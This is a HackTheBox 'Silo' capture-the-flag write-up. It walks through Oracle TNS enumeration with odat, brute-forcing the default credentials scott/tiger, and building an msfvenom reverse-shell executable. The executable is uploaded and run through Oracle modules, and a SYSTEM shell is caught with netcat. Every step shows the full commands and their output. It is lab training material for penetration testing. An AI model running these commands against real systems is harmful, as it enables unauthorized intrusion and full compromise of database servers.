# Silo | HackTheBox

### 1. Scan
```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -A -p- -T4 10.129.1.168
Nmap scan report for 10.129.1.168
Host is up, received echo-reply ttl 127 (0.29s latency).
Scanned at 2021-06-09 05:03:27 EDT for 2378s
Not shown: 65520 closed ports
Reason: 65520 resets
PORT      STATE SERVICE      REASON          VERSION
80/tcp    open  http         syn-ack ttl 127 Microsoft IIS httpd 8.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: IIS Windows Server
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   syn-ack ttl 127 Oracle TNS listener 11.2.0.2.0 (unauthorized)
5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49159/tcp open  oracle-tns   syn-ack ttl 127 Oracle TNS listener (requires service name)
49160/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49161/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49162/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=6/9%OT=80%CT=1%CU=31373%PV=Y%DS=2%DC=T%G=Y%TM=60C08D29
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=7
OS:)SEQ(SP=104%GCD=1%ISR=10B%TI=I%CI=I%TS=7)OPS(O1=M54DNW8ST11%O2=M54DNW8ST
OS:11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M54DNW8ST11%O6=M54DST11)WIN(W1=2000
OS:%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M54D
OS:NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W
OS:=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)
OS:T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S
OS:+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=
OS:Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G
OS:%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Uptime guess: 0.043 days (since Wed Jun  9 04:41:46 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 62732/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 35229/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 53888/udp): CLEAN (Timeout)
|   Check 4 (port 17211/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: supported
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-06-09T09:42:56
|_  start_date: 2021-06-09T08:41:56

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   297.97 ms 10.10.14.1
2   303.31 ms 10.129.1.168

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun  9 05:43:05 2021 -- 1 IP address (1 host up) scanned in 2378.78 seconds
```
The machine is Windows 7, running SMB, two IIS HTTP servers on 80 and 47001 and Oracle on 1521.

### 2. Enumeration
There are no shares available, and both websites come up empty for dirbusting. Looking at the Oracle listener next. Run oscanner and get absolutely nothing.
```bash
┌──(kali㉿kali)-[10.10.14.30]-[~/Desktop]
└─$ oscanner -s 10.129.1.168 -P 1521                                                                                                                                                     130 ⨯
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Oracle Scanner 1.0.6 by patrik@cqure.net
--------------------------------------------------
[-] Checking host 10.129.1.168
[x] Failed to enumerate sids from host
[-] Loading services/sids from service file
Plugin ork.plugins.CheckOracleVersion failed
Plugin ork.plugins.GetPrivilegesForAccounts failed
Plugin ork.plugins.GetRoles failed
Plugin ork.plugins.GetPasswordPolicy failed
Plugin ork.plugins.GetPasswordPolicyForAccounts failed
Plugin ork.plugins.GetAccountHashes failed
Plugin ork.plugins.GetPrivilegesForRoles failed
Plugin ork.plugins.GetAuditInfo failed
[x] Failed to write report file
[x] oscanner_10_129_1_168_report.xml (Permission denied)
```
Other attempts to pull info from Oracle also don't work out too well.
```bash
┌──(kali㉿kali)-[10.10.14.30]-[~/Desktop]
└─$ tnscmd10g status -p 1521 -h 10.129.1.168 --10G
sending (CONNECT_DATA=(CID=(PROGRAM=)(HOST=linux)(USER=oracle))(COMMAND=status)(ARGUMENTS=64)(SERVICE=LISTENER)(VERSION=169869568)) to 10.129.1.168:1521
writing 181 bytes
reading
.e......"..Y(DESCRIPTION=(TMP=)(VSNNUM=186647040)(ERR=1189)(ERROR_STACK=(ERROR=(CODE=1189)(EMFI=4))))
```
Finally try odat, which is able to get somewhere and retrieve a valid SID. Note that running this tool with "all" is a bad idea, it takes ages and I wasted well over an hour waiting for all the tests to run. Best to run each module seperately. Starting with sidguesser.
```bash
┌──(kali㉿kali)-[10.10.14.30]-[~/Extra-Tools/odat]
└─$ python3 odat.py sidguesser -s 10.129.1.168 -P 1521

[1] (10.129.1.168:1521): Searching valid SIDs
[1.1] Searching valid SIDs thanks to a well known SID list on the 10.129.1.168:1521 server
[+] 'XE' is a valid SID. Continue...
```
With the XE SID recovered, run a wordlist against it.
```bash
┌──(kali㉿kali)-[10.10.14.30]-[~/Extra-Tools/odat]
└─$ python3 odat.py passwordguesser -s 10.129.1.168 -P 1521 -d XE --accounts-file accounts/oracle_default_userpass.txt                 

[1] (10.129.1.168:1521): Searching valid accounts on the 10.129.1.168 server, port 1521
[!] Notice: 'ctxsys' account is locked, so skipping this username for password                                                                                                | ETA:  00:27:24 
[!] Notice: 'hr' account is locked, so skipping this username for password                                                                                                    | ETA:  00:25:33 
[!] Notice: 'mdsys' account is locked, so skipping this username for password                                                                                                 | ETA:  00:21:58 
[!] Notice: 'dbsnmp' account is locked, so skipping this username for password                                                                                                | ETA:  00:18:27 
[!] Notice: 'dip' account is locked, so skipping this username for password                                                                                                   | ETA:  00:17:55 
[!] Notice: 'system' account is locked, so skipping this username for password#########################                                                                       | ETA:  00:11:59 
[!] Notice: 'xdb' account is locked, so skipping this username for password#####################################################                                              | ETA:  00:07:32 
[!] Notice: 'outln' account is locked, so skipping this username for password#############################################################                                    | ETA:  00:05:51 
[+] Valid credentials found: scott/tiger. Continue...              ####################################################################################################       | ETA:  00:01:05 
100% |########################################################################################################################################################################| Time: 00:28:08 
[+] Accounts found on 10.129.1.168:1521/sid:XE: 
scott/tiger
```
Valid default creds were found: `scott:tiger`. These can be leveraged to further interact with the system.

### 3. Get a shell
Reference: https://infinitelogins.com/2020/12/03/pentesting-oracle-databases-with-odat/  
Let's try and get a reverse she-  
```bash
┌──(kali㉿kali)-[10.10.14.30]-[~/Extra-Tools/odat]
└─$ python3 odat.py java -s 10.129.1.168 -d XE -U scott -P tiger --reverse-shell 10.10.14.30 9999                                                                                          2 ⨯

[1] (10.129.1.168:1521): Try to give you a nc reverse shell from the 10.129.1.168 server
07:56:27 WARNING -: Java reverse shell is not implement for Windows yet
```
Damn. Would have been nice. Can still do it by uploading and executing a file. First, generate a reverse shell executable...
```bash
┌──(kali㉿kali)-[10.10.14.30]-[~/Desktop]
└─$ msfvenom --arch x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.10.14.30 LPORT=9999 -f exe > rev.exe
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```
Put this payload on the remote machine using odat.
```bash
┌──(kali㉿kali)-[10.10.14.30]-[~/Extra-Tools/odat]
└─$ python3 odat.py utlfile -s 10.129.1.168 --sysdba -d XE -U scott -P tiger --putFile C:/Windows/Temp/ rev.exe /home/kali/Desktop/rev.exe                                                 2 ⨯

[1] (10.129.1.168:1521): Put the /home/kali/Desktop/rev.exe local file in the C:/Windows/Temp/ folder like rev.exe on the 10.129.1.168 server
[+] The /home/kali/Desktop/rev.exe file was created on the C:/Windows/Temp/ directory on the 10.129.1.168 server like the rev.exe file
```
Execute the file with a listener running.
```bash
┌──(kali㉿kali)-[10.10.14.30]-[~/Extra-Tools/odat]
└─$ python3 odat.py externaltable -s 10.129.1.168 --sysdba -d XE -U scott -P tiger --exec C:/Windows/Temp/ rev.exe           

[1] (10.129.1.168:1521): Execute the rev.exe command stored in the C:/Windows/Temp/ path
```
Catch the shell.
```bash
┌──(kali㉿kali)-[10.10.14.30]-[~/Desktop]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.30] from (UNKNOWN) [10.129.1.168] 49166
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\oraclexe\app\oracle\product\11.2.0\server\DATABASE>whoami
nt authority\system
```